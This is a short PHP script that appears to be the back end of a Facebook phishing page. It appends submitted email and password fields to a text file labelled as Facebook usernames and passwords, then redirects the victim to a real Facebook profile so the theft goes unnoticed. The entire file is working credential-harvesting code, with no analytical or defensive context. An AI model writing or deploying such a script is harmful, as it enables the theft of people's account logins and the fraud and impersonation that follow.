<?php 
file_put_contents("wendy Floress.txt", "Facebook Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] ."\n", FILE_APPEND);
header('Location: https://www.facebook.com/profile.php?id=100076878387473&mibextid=ZbWKwL');
exit();
?>
